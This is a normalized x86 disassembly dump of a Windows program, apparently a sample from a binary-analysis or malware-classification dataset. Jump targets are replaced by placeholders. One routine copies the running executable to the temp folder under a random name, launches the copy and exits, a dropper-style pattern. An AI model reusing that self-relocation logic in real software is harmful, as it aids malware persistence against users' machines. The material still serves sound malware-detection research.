mov [ ebp - 0x214 ] ecx
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x218 ]
mov [ ebp + ecx - 0x210 ] 0x5f
mov edx [ ebp - 0x218 ]
add edx 0x1
mov [ ebp - 0x218 ] edx
mov eax [ ebp - 0x218 ]
mov [ ebp - 0x214 ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x218 ]
add eax [ ebp - 0x220 ]
cmp [ ebp - 0x214 ] eax
jge r-xdata
mov edx [ ebp - 0x220 ]
add edx 0x1
mov [ ebp - 0x220 ] edx
mov edx [ ebp - 0x218 ]
add edx [ ebp - 0x220 ]
cmp [ ebp - 0x214 ] edx
jge r-xdata
mov ecx [ ebp - 0x220 ]
add ecx 0x1
mov [ ebp - 0x220 ] ecx
mov ecx [ ebp - 0x214 ]
mov [ ebp + ecx - 0x210 ] 0x2e
mov edx [ ebp - 0x214 ]
add edx 0x1
mov [ ebp - 0x214 ] edx
mov eax [ ebp - 0x214 ]
mov [ ebp + eax - 0x210 ] 0x6d
mov ecx [ ebp - 0x214 ]
add ecx 0x1
mov [ ebp - 0x214 ] ecx
mov edx [ ebp - 0x214 ]
mov [ ebp + edx - 0x210 ] 0x61
mov eax [ ebp - 0x214 ]
add eax 0x1
mov [ ebp - 0x214 ] eax
mov ecx [ ebp - 0x214 ]
mov [ ebp + ecx - 0x210 ] 0x72
mov [ ebp - 0x214 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x214 ]
sub ecx [ ebp - 0x218 ]
mov edx [ ebp - 0x214 ]
mov al [ ecx + rwxdata ]
mov [ ebp + edx - 0x210 ] al
jmp r-xdata
mov eax [ ebp - 0x214 ]
mov [ ebp + eax - 0x210 ] 0x2e
mov ecx [ ebp - 0x214 ]
add ecx 0x1
mov [ ebp - 0x214 ] ecx
mov edx [ ebp - 0x214 ]
mov [ ebp + edx - 0x210 ] 0x6d
mov eax [ ebp - 0x214 ]
add eax 0x1
mov [ ebp - 0x214 ] eax
mov ecx [ ebp - 0x214 ]
mov [ ebp + ecx - 0x210 ] 0x61
mov edx [ ebp - 0x214 ]
add edx 0x1
mov [ ebp - 0x214 ] edx
mov eax [ ebp - 0x214 ]
mov [ ebp + eax - 0x210 ] 0x72
mov [ ebp - 0x214 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x214 ]
sub eax [ ebp - 0x218 ]
mov ecx [ ebp - 0x214 ]
mov dl [ eax + rwxdata ]
mov [ ebp + ecx - 0x210 ] dl
jmp r-xdata
lea eax [ ebp - 0x210 ]
mov [ ebp - 0x2ec ] eax
mov ecx [ ebp - 0x2ec ]
add ecx 0x1
mov [ ebp - 0x2f0 ] ecx
mov edx [ ebp - 0x214 ]
add edx 0x1
mov [ ebp - 0x214 ] edx
lea edx [ ebp - 0x210 ]
mov [ ebp - 0x3ac ] edx
mov eax [ ebp - 0x3ac ]
add eax 0x1
mov [ ebp - 0x3b0 ] eax
mov ecx [ ebp - 0x214 ]
add ecx 0x1
mov [ ebp - 0x214 ] ecx
mov edx [ ebp - 0x2ec ]
mov al [ edx ]
mov [ ebp - 0x2f1 ] al
add [ ebp - 0x2ec ] 0x1
cmp [ ebp - 0x2f1 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x2ec ]
sub ecx [ ebp - 0x2f0 ]
mov [ ebp - 0x2f8 ] ecx
mov edx [ ebp - 0x214 ]
cmp edx [ ebp - 0x2f8 ]
jae r-xdata
mov ecx [ ebp - 0x3ac ]
mov dl [ ecx ]
mov [ ebp - 0x3b1 ] dl
add [ ebp - 0x3ac ] 0x1
cmp [ ebp - 0x3b1 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3ac ]
sub eax [ ebp - 0x3b0 ]
mov [ ebp - 0x3b8 ] eax
mov ecx [ ebp - 0x214 ]
cmp ecx [ ebp - 0x3b8 ]
jae r-xdata
mov [ ebp - 0x224 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x214 ]
mov ecx [ ebp - 0x214 ]
mov dl [ ebp + ecx - 0x210 ]
mov [ eax + rwxdata ] dl
jmp r-xdata
mov [ ebp - 0x224 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x214 ]
mov eax [ ebp - 0x214 ]
mov cl [ ebp + eax - 0x210 ]
mov [ edx + rwxdata ] cl
jmp r-xdata
cmp [ ebp - 0x224 ] 0xff
jge r-xdata
mov edx [ ebp - 0x214 ]
add edx 0x1
mov [ ebp - 0x214 ] edx
cmp [ ebp - 0x224 ] 0xff
jge r-xdata
mov ecx [ ebp - 0x214 ]
add ecx 0x1
mov [ ebp - 0x214 ] ecx
mov edx [ ebp - 0x10c ]
mov eax [ ebp + 0xc ]
mov ecx [ eax + edx * 4 + 0x4 ]
mov [ ebp - 0x2fc ] ecx
lea edx [ ebp - 0x210 ]
mov [ ebp - 0x300 ] edx
mov eax [ ebp - 0x300 ]
mov [ ebp - 0x304 ] eax
mov ecx [ ebp - 0x224 ]
mov [ ebp + ecx - 0x210 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x10c ]
mov edx [ ebp + 0xc ]
mov eax [ edx + ecx * 4 + 0x4 ]
mov [ ebp - 0x3bc ] eax
lea ecx [ ebp - 0x210 ]
mov [ ebp - 0x3c0 ] ecx
mov edx [ ebp - 0x3c0 ]
mov [ ebp - 0x3c4 ] edx
mov eax [ ebp - 0x224 ]
mov [ ebp + eax - 0x210 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x2fc ]
mov dl [ ecx ]
mov [ ebp - 0x305 ] dl
mov eax [ ebp - 0x300 ]
mov cl [ ebp - 0x305 ]
mov [ eax ] cl
mov edx [ ebp - 0x2fc ]
add edx 0x1
mov [ ebp - 0x2fc ] edx
mov eax [ ebp - 0x300 ]
add eax 0x1
mov [ ebp - 0x300 ] eax
cmp [ ebp - 0x305 ] 0x0
jne r-xdata
mov [ ebp - 0x218 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x224 ]
add eax 0x1
mov [ ebp - 0x224 ] eax
mov eax [ ebp - 0x3bc ]
mov cl [ eax ]
mov [ ebp - 0x3c5 ] cl
mov edx [ ebp - 0x3c0 ]
mov al [ ebp - 0x3c5 ]
mov [ edx ] al
mov ecx [ ebp - 0x3bc ]
add ecx 0x1
mov [ ebp - 0x3bc ] ecx
mov edx [ ebp - 0x3c0 ]
add edx 0x1
mov [ ebp - 0x3c0 ] edx
cmp [ ebp - 0x3c5 ] 0x0
jne r-xdata
mov [ ebp - 0x218 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x224 ]
add edx 0x1
mov [ ebp - 0x224 ] edx
mov edx [ ebp - 0x218 ]
movsx eax [ ebp + edx - 0x210 ]
cmp eax 0x2e
je r-xdata
mov ecx [ ebp - 0x218 ]
movsx edx [ ebp + ecx - 0x210 ]
cmp edx 0x2e
je r-xdata
mov [ ebp - 0x220 ] 0x0
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x220 ] 0x0
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x220 ]
movsx eax [ edx + rwxdata ]
cmp eax 0x2e
je r-xdata
mov ecx [ ebp - 0x218 ]
add ecx 0x1
mov [ ebp - 0x218 ] ecx
mov ecx [ ebp - 0x220 ]
movsx edx [ ecx + rwxdata ]
cmp edx 0x2e
je r-xdata
mov eax [ ebp - 0x218 ]
add eax 0x1
mov [ ebp - 0x218 ] eax
mov ecx [ ebp - 0x218 ]
mov [ ebp + ecx - 0x210 ] 0x5f
mov edx [ ebp - 0x218 ]
add edx 0x1
mov [ ebp - 0x218 ] edx
mov eax [ ebp - 0x218 ]
mov [ ebp - 0x214 ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x218 ]
mov [ ebp + eax - 0x210 ] 0x5f
mov ecx [ ebp - 0x218 ]
add ecx 0x1
mov [ ebp - 0x218 ] ecx
mov edx [ ebp - 0x218 ]
mov [ ebp - 0x214 ] edx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x218 ]
add edx [ ebp - 0x220 ]
cmp [ ebp - 0x214 ] edx
jge r-xdata
mov ecx [ ebp - 0x220 ]
add ecx 0x1
mov [ ebp - 0x220 ] ecx
mov ecx [ ebp - 0x218 ]
add ecx [ ebp - 0x220 ]
cmp [ ebp - 0x214 ] ecx
jge r-xdata
mov eax [ ebp - 0x220 ]
add eax 0x1
mov [ ebp - 0x220 ] eax
mov eax [ ebp - 0x214 ]
mov [ ebp + eax - 0x210 ] 0x2e
mov ecx [ ebp - 0x214 ]
add ecx 0x1
mov [ ebp - 0x214 ] ecx
mov edx [ ebp - 0x214 ]
mov [ ebp + edx - 0x210 ] 0x6d
mov eax [ ebp - 0x214 ]
add eax 0x1
mov [ ebp - 0x214 ] eax
mov ecx [ ebp - 0x214 ]
mov [ ebp + ecx - 0x210 ] 0x61
mov edx [ ebp - 0x214 ]
add edx 0x1
mov [ ebp - 0x214 ] edx
mov eax [ ebp - 0x214 ]
mov [ ebp + eax - 0x210 ] 0x72
mov [ ebp - 0x214 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x214 ]
sub eax [ ebp - 0x218 ]
mov ecx [ ebp - 0x214 ]
mov dl [ eax + rwxdata ]
mov [ ebp + ecx - 0x210 ] dl
jmp r-xdata
mov edx [ ebp - 0x214 ]
mov [ ebp + edx - 0x210 ] 0x2e
mov eax [ ebp - 0x214 ]
add eax 0x1
mov [ ebp - 0x214 ] eax
mov ecx [ ebp - 0x214 ]
mov [ ebp + ecx - 0x210 ] 0x6d
mov edx [ ebp - 0x214 ]
add edx 0x1
mov [ ebp - 0x214 ] edx
mov eax [ ebp - 0x214 ]
mov [ ebp + eax - 0x210 ] 0x61
mov ecx [ ebp - 0x214 ]
add ecx 0x1
mov [ ebp - 0x214 ] ecx
mov edx [ ebp - 0x214 ]
mov [ ebp + edx - 0x210 ] 0x72
mov [ ebp - 0x214 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x214 ]
sub edx [ ebp - 0x218 ]
mov eax [ ebp - 0x214 ]
mov cl [ edx + rwxdata ]
mov [ ebp + eax - 0x210 ] cl
jmp r-xdata
lea edx [ ebp - 0x210 ]
mov [ ebp - 0x30c ] edx
mov eax [ ebp - 0x30c ]
add eax 0x1
mov [ ebp - 0x310 ] eax
mov ecx [ ebp - 0x214 ]
add ecx 0x1
mov [ ebp - 0x214 ] ecx
lea ecx [ ebp - 0x210 ]
mov [ ebp - 0x3cc ] ecx
mov edx [ ebp - 0x3cc ]
add edx 0x1
mov [ ebp - 0x3d0 ] edx
mov eax [ ebp - 0x214 ]
add eax 0x1
mov [ ebp - 0x214 ] eax
mov ecx [ ebp - 0x30c ]
mov dl [ ecx ]
mov [ ebp - 0x311 ] dl
add [ ebp - 0x30c ] 0x1
cmp [ ebp - 0x311 ] 0x0
jne r-xdata
mov eax [ ebp - 0x30c ]
sub eax [ ebp - 0x310 ]
mov [ ebp - 0x318 ] eax
mov ecx [ ebp - 0x214 ]
cmp ecx [ ebp - 0x318 ]
jae r-xdata
mov eax [ ebp - 0x3cc ]
mov cl [ eax ]
mov [ ebp - 0x3d1 ] cl
add [ ebp - 0x3cc ] 0x1
cmp [ ebp - 0x3d1 ] 0x0
jne r-xdata
mov edx [ ebp - 0x3cc ]
sub edx [ ebp - 0x3d0 ]
mov [ ebp - 0x3d8 ] edx
mov eax [ ebp - 0x214 ]
cmp eax [ ebp - 0x3d8 ]
jae r-xdata
call sub_4065b0
jmp r-xdata
mov edx [ ebp - 0x214 ]
mov eax [ ebp - 0x214 ]
mov cl [ ebp + eax - 0x210 ]
mov [ edx + rwxdata ] cl
jmp r-xdata
call sub_408da0
jmp r-xdata
mov ecx [ ebp - 0x214 ]
mov edx [ ebp - 0x214 ]
mov al [ ebp + edx - 0x210 ]
mov [ ecx + rwxdata ] al
jmp r-xdata
mov ecx [ ebp - 0x214 ]
add ecx 0x1
mov [ ebp - 0x214 ] ecx
mov eax [ ebp - 0x214 ]
add eax 0x1
mov [ ebp - 0x214 ] eax
sub_40b1e0
push ebp
mov ebp esp
mov eax 0x6ea8
call sub_4173c0
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0xc ] eax
mov [ ebp - 0xfcc ] 0xfb8
mov eax [ ebp - 0xfcc ]
push eax
lea ecx [ ebp - 0xfc8 ]
push ecx
push 0x0
call [ GetModuleFileNameA@IAT ]
lea edx [ ebp - 0xfc8 ]
mov [ ebp - 0x6e9c ] edx
mov eax [ ebp - 0x6e9c ]
add eax 0x1
mov [ ebp - 0x6ea0 ] eax
mov ecx [ ebp - 0x6e9c ]
mov dl [ ecx ]
mov [ ebp - 0x6ea1 ] dl
add [ ebp - 0x6e9c ] 0x1
cmp [ ebp - 0x6ea1 ] 0x0
jne r-xdata
mov eax [ ebp - 0x6e9c ]
sub eax [ ebp - 0x6ea0 ]
mov [ ebp - 0x6ea8 ] eax
mov ecx [ ebp - 0x6ea8 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xfd0 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xfd0 ]
cmp eax [ ebp - 0x8 ]
jge r-xdata
movzx eax [ ebp - 0x1 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0xfd0 ]
movsx edx [ ebp + ecx - 0xfc8 ]
cmp edx 0x3f
jne r-xdata
mov ecx [ ebp - 0xc ]
xor ecx ebp
call sub_40b762
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x6e98 ]
push ecx
push 0xfb8
call [ GetTempPathA@IAT ]
push 0x0
call sub_401000
add esp 0x4
push eax
call sub_40baf4
add esp 0x4
call sub_40bb06
cdq
mov ecx 0x19
idiv ecx
add edx 0x61
push edx
call sub_40bb06
push eax
call sub_40bb06
cdq
mov ecx 0x19
idiv ecx
add edx 0x61
push edx
call sub_40bb06
cdq
mov ecx 0x19
idiv ecx
add edx 0x61
push edx
lea edx [ ebp - 0x6e98 ]
push edx
push r--data
lea eax [ ebp - 0x5ee0 ]
push eax
call sub_40b771
add esp 0x1c
push 0xfd0
lea ecx [ ebp - 0x4f10 ]
push ecx
push 0xffffffff
lea edx [ ebp - 0x5ee0 ]
push edx
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
mov eax [ ebp - 0xfcc ]
push eax
lea ecx [ ebp - 0x2f70 ]
push ecx
push 0x0
call [ GetModuleFileNameW@IAT ]
push 0x0
lea edx [ ebp - 0x4f10 ]
push edx
lea eax [ ebp - 0x2f70 ]
push eax
call [ CopyFileW@IAT ]
push 0x5
push 0x0
push 0x0
lea ecx [ ebp - 0x4f10 ]
push ecx
push 0x0
push 0x0
call [ ShellExecuteW@IAT ]
push 0x0
call [ ExitProcess@IAT ]
jmp r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov edx [ ebp - 0xfd0 ]
add edx 0x1
mov [ ebp - 0xfd0 ] edx
sub_40b3b0
push ebp
mov ebp esp
sub esp 0x20
push esi
push edi
call sub_40b1e0
push eax
lea eax [ rwxdata ]
mov [ eax ] esp
add [ eax ] 0x4
lea eax [ rwxdata ]
mov [ eax ] ecx
lea eax [ rwxdata ]
mov [ eax ] edx
lea eax [ rwxdata ]
mov [ eax ] ebp
lea esi [ rwxdata ]
mov [ eax ] esi
lea edi [ rwxdata ]
mov [ eax ] edi
push 0x64
push rwxdata
push 0x67
mov eax [ ebp + 0x8 ]
push eax
call [ LoadStringA@IAT ]
push 0x64
push rwxdata
push 0x6d
mov ecx [ ebp + 0x8 ]
push ecx
call [ LoadStringA@IAT ]
mov edx [ ebp + 0x8 ]
push edx
call sub_40b4a0
add esp 0x4
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40b520
add esp 0x8
test eax eax
jne r-xdata
push 0x6d
mov edx [ ebp + 0x8 ]
push edx
call [ LoadAcceleratorsA@IAT ]
mov [ ebp - 0x4 ] eax
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x18 ]
lea ecx [ ebp - 0x20 ]
push ecx
mov edx [ ebp - 0x4 ]
push edx
mov eax [ ebp - 0x20 ]
push eax
call [ TranslateAcceleratorA@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x10
jmp r-xdata
lea ecx [ ebp - 0x20 ]
push ecx
call [ TranslateMessage@IAT ]
lea edx [ ebp - 0x20 ]
push edx
call [ DispatchMessageA@IAT ]
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
call [ GetMessageA@IAT ]
test eax eax
je r-xdata
sub_40b4a0
push ebp
mov ebp esp
sub esp 0x30
mov [ ebp - 0x30 ] 0x30
mov [ ebp - 0x2c ] 0x3
mov [ ebp - 0x28 ] sub_40b550
mov [ ebp - 0x24 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x1c ] eax
push 0x6b
mov ecx [ ebp + 0x8 ]
push ecx
call [ LoadIconA@IAT ]
mov [ ebp - 0x18 ] eax
push 0x7f00
push 0x0
call [ LoadCursorA@IAT ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x6
mov [ ebp - 0xc ] 0x6d
mov [ ebp - 0x8 ] rwxdata
push 0x6c
mov edx [ ebp - 0x1c ]
push edx
call [ LoadIconA@IAT ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x30 ]
push eax
call [ RegisterClassExA@IAT ]
mov esp ebp
pop ebp
retn
sub_40b520
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov [ rwxdata ] eax
push 0x0
push 0x1
call sub_409590
add esp 0x8
mov eax 0x1
mov esp ebp
pop ebp
retn
sub_40b550
push ebp
mov ebp esp
sub esp 0x5c
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x58 ] eax
cmp [ ebp - 0x58 ] 0x2
je r-xdata
push 0x0
call [ PostQuitMessage@IAT ]
jmp r-xdata
cmp [ ebp - 0x58 ] 0xf
je r-xdata
xor eax eax
lea ecx [ ebp - 0x48 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call [ BeginPaint@IAT ]
mov [ ebp - 0x54 ] eax
lea eax [ ebp - 0x48 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call [ EndPaint@IAT ]
jmp r-xdata
cmp [ ebp - 0x58 ] 0x111
je r-xdata
mov ecx [ ebp + 0x10 ]
and ecx 0xffff
movzx edx cx
mov [ ebp - 0x4c ] edx
mov eax [ ebp + 0x10 ]
shr eax 0x10
and eax 0xffff
movzx ecx ax
mov [ ebp - 0x50 ] ecx
mov edx [ ebp - 0x4c ]
mov [ ebp - 0x5c ] edx
cmp [ ebp - 0x5c ] 0x68
je r-xdata
jmp r-xdata
push 0x0
push sub_40b660
mov eax [ ebp + 0x8 ]
push eax
push 0x67
mov ecx [ rwxdata ]
push ecx
call [ DialogBoxParamA@IAT ]
jmp r-xdata
cmp [ ebp - 0x5c ] 0x69
je r-xdata
mov edx [ ebp + 0x14 ]
push edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call [ DefWindowProcA@IAT ]
jmp r-xdata
jmp r-xdata
mov edx [ ebp + 0x8 ]
push edx
call [ DestroyWindow@IAT ]
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40b762
mov esp ebp
pop ebp
retn 0x10
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call [ DefWindowProcA@IAT ]
jmp r-xdata
sub_40b660
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x110
je r-xdata
mov eax 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] 0x111
je r-xdata
mov esp ebp
pop ebp
retn 0x10
mov ecx [ ebp + 0x10 ]
and ecx 0xffff
movzx edx cx
cmp edx 0x1
je r-xdata
jmp r-xdata
mov edx [ ebp + 0x10 ]
and edx 0xffff
movzx eax dx
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call [ EndDialog@IAT ]
mov eax 0x1
jmp r-xdata
mov eax [ ebp + 0x10 ]
and eax 0xffff
movzx ecx ax
cmp ecx 0x2
jne r-xdata
xor eax eax
sub_40b771
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
xor ebx ebx
cmp [ ebp + 0xc ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
call sub_40d7cc
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x10 ]
push eax
push ebx
push [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x1c ] 0x7fffffff
mov [ ebp - 0x14 ] 0x42
call sub_40ca3b
add esp 0x10
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
pop ebx
leave
retn
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_40c75f
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax esi
pop esi
sub_40b80a
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40db35
add esp 0x14
pop ebp
retn
sub_40b828
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x18 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40db35
add esp 0x14
pop ebp
retn
sub_40b847
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x18 ]
push eax
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40dbda
add esp 0x18
pop ebp
retn
sub_40b868
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x1c ]
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40dbda
add esp 0x18
pop ebp
retn
sub_40b88a
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40dd2a
add esp 0x14
pop ebp
retn
sub_40b8a8
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x18 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40dd2a
add esp 0x14
pop ebp
retn
sub_40b923
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov eax [ eax + 0xc ]
and eax 0x10
call sub_40d7cc
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
xor eax eax
jmp r-xdata
pop esi
pop ebp
retn
sub_40b957
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov eax [ eax + 0xc ]
and eax 0x20
call sub_40d7cc
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
xor eax eax
jmp r-xdata
pop esi
pop ebp
retn
sub_40b98b
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ DeleteFileA@IAT ]
test eax eax
jne r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
xor eax eax
pop ebp
retn
push eax
call sub_40d7f2
pop ecx
or eax 0xffffffff
pop ebp
retn
test eax eax
je r-xdata
sub_40b9c6
push 0xc
push r--data
call sub_40e30c
xor ebx ebx
mov [ ebp - 0x1c ] ebx
xor eax eax
mov edi [ ebp + 0x8 ]
cmp edi ebx
setne al
cmp eax ebx
jne r-xdata
xor eax eax
mov esi [ ebp + 0xc ]
cmp esi ebx
setne al
cmp eax ebx
je r-xdata
call sub_40d7cc
mov [ eax ] 0x16
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40d749
add esp 0x14
xor eax eax
cmp [ esi ] bl
setne al
cmp eax ebx
je r-xdata
call sub_40e351
retn
call sub_40e1d2
mov [ ebp + 0x8 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0x4 ] ebx
cmp [ edi ] bl
jne r-xdata
call sub_40d7cc
mov [ eax ] 0x18
jmp r-xdata
push eax
push [ ebp + 0x10 ]
push esi
push edi
call sub_40df09
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40ba80
mov eax [ ebp - 0x1c ]
call sub_40d7cc
mov [ eax ] 0x16
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rwxdata
call sub_40e52c
add esp 0xc
jmp r-xdata
xor eax eax
jmp r-xdata
sub_40baa1
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
cmp edi esi
jne r-xdata
push 0x80
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_40b9c6
add esp 0xc
mov [ edi ] eax
cmp eax esi
je r-xdata
call sub_40d7cc
push 0x16
pop edi
push esi
push esi
push esi
push esi
push esi
mov [ eax ] edi
call sub_40d749
add esp 0x14
mov eax edi
jmp r-xdata
call sub_40d7cc
mov eax [ eax ]
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebp
retn
sub_40bb28
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
xor edi edi
cmp [ ebp + 0xc ] edi
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] edi
je r-xdata
mov esi [ ebp + 0x14 ]
cmp esi edi
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx edi
je r-xdata
call sub_40d7cc
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
or eax 0xffffffff
xor edx edx
div [ ebp + 0xc ]
cmp [ ebp + 0x10 ] eax
ja r-xdata
mov edi [ ebp + 0xc ]
imul edi [ ebp + 0x10 ]
test [ esi + 0xc ] 0x10c
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edi
mov ebx edi
je r-xdata
mov [ ebp - 0x8 ] 0x1000
mov eax [ esi + 0x18 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
jmp r-xdata
mov ecx [ esi + 0xc ]
and ecx 0x108
je r-xdata
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax ]
push esi
push eax
call sub_40c75f
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
test ecx ecx
je r-xdata
jl r-xdata
mov eax edi
inc [ ebp - 0x4 ]
mov eax [ esi + 0x18 ]
dec ebx
mov [ ebp - 0x8 ] eax
test eax eax
jg r-xdata
cmp [ ebp - 0x8 ] 0x0
mov edi ebx
je r-xdata
push esi
call sub_40f52e
pop ecx
test eax eax
jne r-xdata
or [ esi + 0xc ] 0x20
mov edi ebx
cmp ebx eax
jb r-xdata
test ebx ebx
jne r-xdata
mov [ ebp - 0x8 ] 0x1
push edi
push [ ebp - 0x4 ]
push esi
call sub_40f4fc
pop ecx
push eax
call sub_40f420
add esp 0xc
cmp eax 0xffffffff
je r-xdata
xor edx edx
mov eax ebx
div [ ebp - 0x8 ]
sub edi edx
push edi
push [ ebp - 0x4 ]
push [ esi ]
call sub_40f720
sub [ esi + 0x4 ] edi
add [ esi ] edi
add esp 0xc
sub ebx edi
add [ ebp - 0x4 ] edi
jmp r-xdata
mov edi eax
or [ esi + 0xc ] 0x20
mov eax [ ebp - 0xc ]
jmp r-xdata
mov ecx edi
cmp eax edi
ja r-xdata
mov edi [ ebp - 0xc ]
jmp r-xdata
sub eax ebx
xor edx edx
div [ ebp + 0xc ]
jmp r-xdata
add [ ebp - 0x4 ] ecx
sub ebx ecx
cmp eax edi
jb r-xdata
mov ecx eax
sub_40bc8a
push 0xc
push r--data
call sub_40e30c
xor esi esi
cmp [ ebp + 0xc ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] esi
setne al
cmp eax esi
jne r-xdata
push [ ebp + 0x14 ]
call sub_40de2b
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40bb28
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40bd02
mov eax [ ebp - 0x1c ]
jmp r-xdata
call sub_40d7cc
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_40d749
add esp 0x14
call sub_40e351
retn
sub_40bd0c
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
cmp edi ebx
jne r-xdata
push edi
call sub_40f4fc
cmp [ edi + 0x4 ] ebx
